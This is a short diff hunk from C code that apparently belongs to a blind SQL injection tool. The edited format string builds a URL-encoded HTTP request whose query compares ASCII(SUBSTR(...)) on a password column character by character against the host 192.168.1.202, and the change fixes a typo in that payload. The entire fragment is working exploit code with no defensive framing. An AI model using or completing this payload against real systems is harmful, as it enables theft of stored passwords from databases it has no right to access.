@@ -286,7 +286,7 @@ bool check_password(const void *ctx) {
         "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
         "AND%%20ASCII(SUBSTR("
         "%%60%s%%60" // SUBSTR(`pwd_col`...)
-        ",%i,1))<%%3dASCII(d%%27%s%%27)%%20"
+        ",%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
